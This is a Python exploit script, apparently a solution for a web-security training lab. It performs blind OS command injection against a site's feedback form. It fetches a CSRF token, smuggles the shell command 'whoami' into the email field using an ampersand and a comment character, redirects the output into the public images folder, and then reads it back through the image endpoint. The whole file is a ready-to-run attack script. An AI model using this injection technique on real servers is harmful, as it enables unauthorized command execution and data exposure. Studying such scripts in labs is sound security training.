import urllib.parse
import requests
import sys
import urllib3
import urllib
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}

def get_csrf(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input")['value']
    return csrf


def blind_os_command_injection(s, url, fileName):
    feedback_path = "feedback/submit"
    images_path = f'image?filename={fileName}'
    payload = f'test@test.com & whoami > /var/www/images/{fileName} #'
    csrf_url = "feedback"
    csrf = get_csrf(s, url+csrf_url)
    myData = {
        'csrf':csrf,
        'name':'test',
        'email':payload,
        'subject':'test',
        'message':'test'
    }

    # Perform the redirection here
    r = s.post(url+feedback_path, data=myData, verify=False, proxies=proxies)
    
    # Get the output of the file
    r2 = s.get(url+images_path, verify=False, proxies=proxies)
    if(len(r2.text) > 3):
        print("(+) OS command injection was successful")
        print(f'(+) Output of the command: {r2.text}')
        return True
    else:
        print("(-) OS command injection failed")
        return False


def main():
    if len(sys.argv) != 3:
        print("(+) Usage: python3 %s <url> <fileName>" % sys.argv[0])
        print("(+) Example: python3 %s www.example.com" % sys.argv[0])
        return

    url = sys.argv[1]
    outputFile = sys.argv[2]
    print("Injecting OS command with output redirection...")
    s = requests.Session()
    blind_os_command_injection(s,url, outputFile)

if __name__ == "__main__":
    main()